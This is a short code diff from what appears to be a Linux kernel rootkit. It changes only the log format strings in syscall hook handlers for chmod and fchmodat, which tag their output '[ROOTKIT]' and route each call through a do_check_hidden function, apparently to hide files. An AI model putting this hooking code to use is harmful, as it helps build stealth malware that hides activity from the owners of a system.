@@ -26,7 +26,7 @@ SYSCALL_HOOK_HANDLER1(chroot, orig_chroot, p_regs, const char __user *, s_filena
 SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename, umode_t,
                       ui16_mode)
 {
-    pr_info("[ROOTKIT] chmod(%p, 0%ho)\n", s_filename, ui16_mode);
+    pr_info("[ROOTKIT] chmod(%p, %#ho)\n", s_filename, ui16_mode);
 
     return do_check_hidden(orig_chmod, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -35,7 +35,7 @@ SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename
 SYSCALL_HOOK_HANDLER3(fchmodat, orig_fchmodat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, umode_t, ui16_mode)
 {
-    pr_info("[ROOTKIT] fchmodat(%d, %p, 0%ho)\n", i32_dfd, s_filename, ui16_mode);
+    pr_info("[ROOTKIT] fchmodat(%d, %p, %#ho)\n", i32_dfd, s_filename, ui16_mode);
 
     return do_check_hidden(orig_fchmodat, p_regs, i32_dfd, s_filename, 0);
 }
